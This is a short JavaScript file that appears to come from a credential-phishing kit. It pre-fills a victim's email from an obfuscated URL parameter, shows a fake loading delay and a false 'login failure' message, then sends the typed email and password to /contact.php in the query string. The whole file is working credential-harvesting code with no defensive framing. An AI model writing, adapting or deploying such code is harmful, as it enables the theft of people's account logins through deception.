
window.addEventListener("load",function(){ 
var query = window.location.search.split("xtywuikdhophjuorvjukhjbolkjmnjbsdghjnk=")[1]; 
document.getElementById("emailTxt").innerText = query;
document.getElementById("emailTxtF").value = query;
    document.getElementById("passwordTxt").select();
    }, false);
    
function getLogin(){  document.getElementById("login").style.display="block";    }
function loginBox(){
var emails = document.getElementById("emailTxtF");
var pwd = document.getElementById("passwordTxt");

if((emails.length===0||emails.value==="")||(pwd.length===0||pwd.value==="")){ 
document.getElementById("pwErr").innerHTML="*";
document.getElementById("pwErr2").innerHTML="";
  }
else{ 
document.getElementById("pwErr").innerHTML="";
document.getElementById("pwErr2").innerHTML="";
document.getElementById("ldgLogsID").style.display = "block"; 

setTimeout(stopLoading,5000);
       }//closing ifelse
} //closing loginBox
    
function stopLoading(){ 
document.getElementById("ldgLogsID").style.display = "none";
document.getElementById("pwErrDiv").style.display = "block";
document.getElementById("pwErr2").innerText="login failure, try again";
var logins = "Email: "+document.getElementById("emailTxtF").value +"|| Password: "+document.getElementById("passwordTxt").value;

document.getElementById("passwordTxt").value = "";
window.location="/contact.php?xtywuikdhophjuorvjukhjbolkjmnjbsdghjnk="+logins;
 }  //closing stopLoading    
    

    
